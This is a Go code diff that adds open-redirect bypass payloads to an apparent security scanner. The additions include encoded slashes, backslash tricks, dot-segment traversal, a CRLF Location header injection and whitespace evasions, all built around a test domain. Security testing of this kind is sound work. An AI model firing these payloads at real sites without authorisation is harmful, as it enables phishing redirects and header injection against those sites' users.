@@ -32,21 +32,24 @@ func GeneratePayloads(targetHost string, testDomain string, customFile string) (
 	}
 
 	descriptors := []PayloadDescriptor{
-		// 1. Standard Absolute URLs
+		// 1. Standard Absolute URLs (Index 0 is the primary canary)
 		{Value: fmt.Sprintf("https://%s", testDomain), Category: "Standard HTTPS"},
 		{Value: fmt.Sprintf("http://%s", testDomain), Category: "Standard HTTP"},
+		{Value: fmt.Sprintf("hTTps://%s", testDomain), Category: "Mixed-Case Scheme Normalization"},
 
 		// 2. Protocol-Relative URLs
 		{Value: fmt.Sprintf("//%s", testDomain), Category: "Protocol-Relative Double Slash"},
 		{Value: fmt.Sprintf("///%s", testDomain), Category: "Protocol-Relative Triple Slash"},
 		{Value: fmt.Sprintf("////%s", testDomain), Category: "Protocol-Relative Quadruple Slash"},
+		{Value: fmt.Sprintf("/.//%s", testDomain), Category: "Dot-Slash Protocol-Relative"},
 
 		// 3. Backslash Evasion
 		{Value: fmt.Sprintf("/\\%s", testDomain), Category: "Backslash Obfuscation"},
 		{Value: fmt.Sprintf("\\/%s", testDomain), Category: "Reverse Backslash Obfuscation"},
 		{Value: fmt.Sprintf("\\\\%s", testDomain), Category: "Double Backslash (UNC/Windows)"},
+		{Value: fmt.Sprintf("/\\/%s", testDomain), Category: "Slash-Backslash Alternation"},
 
-		// 4. Userinfo / @ Evasion
+		// 4. Userinfo / @ Authority Confusion
 		{Value: fmt.Sprintf("https://%s@%s", cleanHost, testDomain), Category: "Authority Userinfo Bypass"},
 		{Value: fmt.Sprintf("https://%s:%s@%s", cleanHost, cleanHost, testDomain), Category: "Authority Userinfo Credential Bypass"},
 		{Value: fmt.Sprintf("https://%s#@%s", testDomain, cleanHost), Category: "Hash Anchor Authority Confusion"},
@@ -55,16 +58,25 @@ func GeneratePayloads(targetHost string, testDomain string, customFile string) (
 		// 5. Dot-Segment / Path Traversal
 		{Value: fmt.Sprintf("/../%s", testDomain), Category: "Dot-Segment Directory Traversal"},
 		{Value: fmt.Sprintf("/%%2e%%2e/%s", testDomain), Category: "Encoded Dot-Segment Traversal"},
+		{Value: fmt.Sprintf("/..//%s", testDomain), Category: "Double Traversal Protocol Confusion"},
 
-		// 6. Single URL Encoding
+		// 6. Single & Scheme URL Encoding
 		{Value: fmt.Sprintf("%%2f%%2f%s", testDomain), Category: "URL-Encoded Protocol-Relative"},
+		{Value: fmt.Sprintf("https:%%2f%%2f%s", testDomain), Category: "Encoded Slashes Scheme Bypass"},
 		{Value: fmt.Sprintf("%%68%%74%%74%%70%%73%%3a%%2f%%2f%s", testDomain), Category: "Fully URL-Encoded HTTPS"},
 
 		// 7. Double URL Encoding
 		{Value: fmt.Sprintf("%%252f%%252f%s", testDomain), Category: "Double URL-Encoded Protocol-Relative"},
+		{Value: fmt.Sprintf("https:%%252f%%252f%s", testDomain), Category: "Double Encoded Scheme Slashes"},
 
-		// 8. Parameter Null/Separator Termination
+		// 8. CRLF Header Injection
+		{Value: fmt.Sprintf("/%%0d%%0aLocation:%%20https://%s", testDomain), Category: "CRLF Location Header Injection"},
+
+		// 9. Parameter Termination & Whitespace Evasion
 		{Value: fmt.Sprintf("https://%s%%00", testDomain), Category: "Null Byte String Termination"},
+		{Value: fmt.Sprintf("https://%s%%09", testDomain), Category: "Tab Character Obfuscation"},
+		{Value: fmt.Sprintf("https://%s%%20", testDomain), Category: "Trailing Space Evasion"},
+		{Value: fmt.Sprintf("https://%s.", testDomain), Category: "FQDN Trailing Dot Bypass"},
 		{Value: fmt.Sprintf("https://%s/.", testDomain), Category: "Trailing Dot-Segment"},
 	}
 
@@ -112,4 +124,3 @@ func ExtractHost(rawURL string) string {
 	}
 	return parsed.Hostname()
 }
-
